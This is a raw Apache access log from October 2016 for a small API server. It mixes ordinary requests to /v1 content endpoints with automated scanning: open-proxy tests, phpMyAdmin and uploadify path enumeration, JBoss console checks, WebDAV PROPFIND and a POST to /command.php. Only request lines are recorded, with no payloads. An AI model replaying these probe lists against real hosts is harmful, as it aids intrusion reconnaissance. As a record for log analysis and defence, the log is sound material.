95.211.144.70 - - [02/Oct/2016:01:42:29 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.211.144.70 - - [02/Oct/2016:01:42:29 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.211.144.70 - - [02/Oct/2016:01:42:29 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.211.144.70 - - [02/Oct/2016:01:42:46 -0600] "-" 408 - "-" "-"
185.25.151.159 - - [02/Oct/2016:01:43:08 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
173.208.213.195 - - [02/Oct/2016:02:19:26 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [02/Oct/2016:03:39:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
173.208.150.116 - - [02/Oct/2016:05:55:36 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
141.212.122.96 - - [02/Oct/2016:08:10:59 -0600] "GET /x HTTP/1.1" 400 226 "-" "Telesphoreo"
5.189.191.140 - - [02/Oct/2016:12:58:00 -0600] "GET /admin/config.php HTTP/1.1" 404 214 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
185.49.14.190 - - [02/Oct/2016:13:40:04 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
93.174.93.218 - - [02/Oct/2016:15:40:33 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [02/Oct/2016:15:40:54 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [02/Oct/2016:15:41:15 -0600] "-" 408 - "-" "-"
89.248.174.4 - - [02/Oct/2016:21:47:41 -0600] "GET /xmlrpc.php HTTP/1.1" 404 208 "-" "-"
43.247.69.135 - - [02/Oct/2016:22:35:46 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
112.126.82.197 - - [02/Oct/2016:23:15:51 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
218.92.147.79 - - [03/Oct/2016:01:50:38 -0600] "OPTIONS / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:50:49 -0600] "GET /uploadify/uploadify.css HTTP/1.1" 404 221 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:50:57 -0600] "GET /uploadify.css HTTP/1.1" 404 211 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:02 -0600] "GET /admin/uploadify/uploadify.css HTTP/1.1" 404 227 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:16 -0600] "GET /public/js/uploadify/uploadify.css HTTP/1.1" 404 231 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:26 -0600] "GET /js/uploadify/uploadify.css HTTP/1.1" 404 224 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:37 -0600] "GET /include/lib/js/uploadify/uploadify.css HTTP/1.1" 404 236 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:48 -0600] "GET /data/plugin/uploadify/uploadify.css HTTP/1.1" 404 233 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:48 -0600] "GET /Public/uploadify/uploadify.css HTTP/1.1" 404 228 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:51:59 -0600] "GET /addons/uploadify/uploadify.css HTTP/1.1" 404 228 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:52:03 -0600] "GET /script/multiupload/uploadify.css HTTP/1.1" 404 230 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:52:17 -0600] "GET /inc/jquery/uploadify/uploadify.css HTTP/1.1" 404 232 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:52:38 -0600] "GET /general/weibo/javascript/LazyUploadify/uploadify.css HTTP/1.1" 404 250 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:52:54 -0600] "GET /uploadify/scripts/uploadify.css HTTP/1.1" 404 229 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:53:09 -0600] "GET /bocadmin/j/custom.js HTTP/1.1" 404 218 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:53:23 -0600] "GET /css/uploadify.css HTTP/1.1" 404 215 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:53:30 -0600] "GET /common/uploadify.css HTTP/1.1" 404 218 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:53:44 -0600] "GET /lib/uploadify.css HTTP/1.1" 404 215 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:53:49 -0600] "GET /admin/css/uploadify.css HTTP/1.1" 404 221 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:54:03 -0600] "GET /js/uploadify.css HTTP/1.1" 404 214 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:54:17 -0600] "GET /JS/jquery.uploadify-v2.1.0/uploadify.css HTTP/1.1" 404 238 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:54:31 -0600] "GET /js/Plug-in/jquery.uploadify/uploadify.css HTTP/1.1" 404 239 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [03/Oct/2016:01:54:38 -0600] "GET /js/jquery.uploadify/uploadify.css HTTP/1.1" 404 231 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
91.196.50.33 - - [03/Oct/2016:02:13:53 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [03/Oct/2016:02:14:30 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
173.208.150.118 - - [03/Oct/2016:02:30:14 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [03/Oct/2016:04:06:52 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
191.96.249.189 - - [03/Oct/2016:06:48:05 -0600] "GET /info.html HTTP/1.0" 404 207 "-" "-"
112.126.82.197 - - [03/Oct/2016:09:24:00 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
180.76.15.153 - - [03/Oct/2016:12:54:42 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.5 - - [03/Oct/2016:12:54:43 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.30 - - [03/Oct/2016:12:54:56 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
46.172.91.20 - - [03/Oct/2016:15:34:20 -0600] "GET / HTTP/1.1" 200 597 "-" "Scanbot"
93.174.93.218 - - [03/Oct/2016:15:43:20 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [03/Oct/2016:15:43:41 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [03/Oct/2016:15:44:01 -0600] "-" 408 - "-" "-"
185.49.14.190 - - [03/Oct/2016:16:07:10 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
212.129.54.164 - - [03/Oct/2016:17:23:46 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
52.78.168.247 - - [03/Oct/2016:21:26:58 -0600] "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
52.78.168.247 - - [03/Oct/2016:21:26:59 -0600] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
52.78.168.247 - - [03/Oct/2016:21:26:59 -0600] "GET /if%20youve%20had%20a%20dose%20of%20a%20freaky%20ghost HTTP/1.1" 404 235 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
52.78.168.247 - - [03/Oct/2016:21:26:59 -0600] "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
52.78.168.247 - - [03/Oct/2016:21:27:00 -0600] "GET /status?full=true HTTP/1.1" 404 204 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
112.126.82.197 - - [03/Oct/2016:22:04:00 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
185.49.14.190 - - [03/Oct/2016:22:06:24 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
213.128.81.66 - - [04/Oct/2016:01:41:35 -0600] "GET / HTTP/1.0" 200 597 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
204.12.217.3 - - [04/Oct/2016:01:58:12 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
192.99.144.140 - - [04/Oct/2016:03:37:36 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
91.196.50.33 - - [04/Oct/2016:04:11:44 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
84.200.7.193 - - [04/Oct/2016:04:43:13 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
195.62.53.168 - - [04/Oct/2016:08:27:23 -0600] "GET /engine/log.txt HTTP/1.1" 404 212 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:30.N) Gecko/20110302 Firefox/30.0"
93.174.93.210 - - [04/Oct/2016:09:02:54 -0600] "GET / HTTP/1.0" 200 597 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:11:17 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:11:41 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:11:45 -0600] "GET /v1//users/1/board/19 HTTP/1.1" 200 237 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:11:45 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:11:47 -0600] "GET /v1//users/1/board/19/block/6 HTTP/1.1" 200 587 "-" "-"
208.64.253.242 - - [04/Oct/2016:11:11:56 -0600] "GET HTTP/1.1 HTTP/1.1" 400 226 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
208.64.253.242 - - [04/Oct/2016:11:11:56 -0600] "GET /admin/config.php HTTP/1.1" 404 214 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:05 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
144.38.197.48 - - [04/Oct/2016:11:12:07 -0600] "-" 408 - "-" "-"
144.38.197.48 - - [04/Oct/2016:11:12:07 -0600] "-" 408 - "-" "-"
144.38.197.48 - - [04/Oct/2016:11:12:07 -0600] "-" 408 - "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:07 -0600] "GET /v1//users/1/board/19 HTTP/1.1" 200 326 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:07 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:11 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:13 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:13 -0600] "GET /v1//volume/3/book/1 HTTP/1.1" 200 575 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:16 -0600] "GET /v1//volume/3/book/1/chapter/5 HTTP/1.1" 200 9178 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:12:25 -0600] "GET /v1//users/1/board/19/block/23 HTTP/1.1" 200 757 "-" "-"
::1 - - [04/Oct/2016:11:12:33 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:11:13:16 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
144.38.197.48 - - [04/Oct/2016:11:14:15 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:14:15 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "http://api.gospelblocks.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:14:19 -0600] "GET /v1 HTTP/1.1" 301 239 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:14:20 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:14:26 -0600] "GET /v1/volume/1 HTTP/1.1" 200 8519 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:14:42 -0600] "GET /v1/volume/1/book/1 HTTP/1.1" 200 1063 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:14:50 -0600] "GET /v1/volume/1/book/1/chapter/1 HTTP/1.1" 200 11065 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
144.38.197.48 - - [04/Oct/2016:11:15:13 -0600] "GET /v1/volume/2/book/4/chapter/1 HTTP/1.1" 200 16612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
212.129.54.164 - - [04/Oct/2016:11:45:02 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
201.6.181.31 - - [04/Oct/2016:12:27:13 -0600] "GET /cgi/common.cgi HTTP/1.0" 404 212 "-" "Wget(linux)"
201.6.181.31 - - [04/Oct/2016:12:27:14 -0600] "GET /stssys.htm HTTP/1.0" 404 208 "-" "Wget(linux)"
201.6.181.31 - - [04/Oct/2016:12:27:14 -0600] "GET / HTTP/1.0" 200 597 "-" "Wget(linux)"
201.6.181.31 - - [04/Oct/2016:12:27:14 -0600] "POST /command.php HTTP/1.0" 404 209 "-" "Wget(linux)"
141.212.122.32 - - [04/Oct/2016:13:47:57 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 zgrab/0.x"
46.172.91.20 - - [04/Oct/2016:14:18:48 -0600] "GET / HTTP/1.1" 200 597 "-" "-"
91.196.50.33 - - [04/Oct/2016:16:42:47 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.49.14.190 - - [04/Oct/2016:16:47:01 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
144.38.177.212 - - [04/Oct/2016:20:41:13 -0600] "-" 408 - "-" "-"
144.38.177.212 - - [04/Oct/2016:20:41:13 -0600] "-" 408 - "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:41:26 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:41:36 -0600] "GET /v1//users/1/board/19 HTTP/1.1" 200 326 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:41:37 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:42:01 -0600] "GET /v1//volume/2 HTTP/1.1" 200 6464 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:42:05 -0600] "GET /v1//volume/2 HTTP/1.1" 200 6464 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:42:05 -0600] "GET /v1//volume/2/book/3 HTTP/1.1" 200 611 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:42:08 -0600] "GET /v1//volume/2/book/3/chapter/2 HTTP/1.1" 200 17401 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [04/Oct/2016:20:42:35 -0600] "GET /v1//users/1/board/19/block/23 HTTP/1.1" 200 971 "-" "-"
113.10.198.66 - - [04/Oct/2016:21:55:07 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
204.12.217.5 - - [04/Oct/2016:22:24:03 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
2600:3c03::f03c:91ff:fe79:ba6f - - [05/Oct/2016:00:24:35 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
93.174.93.218 - - [05/Oct/2016:01:21:44 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [05/Oct/2016:01:22:05 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [05/Oct/2016:01:22:26 -0600] "-" 408 - "-" "-"
204.12.217.4 - - [05/Oct/2016:03:42:30 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [05/Oct/2016:06:10:22 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
107.183.144.139 - - [05/Oct/2016:07:22:00 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
180.76.15.140 - - [05/Oct/2016:07:59:26 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
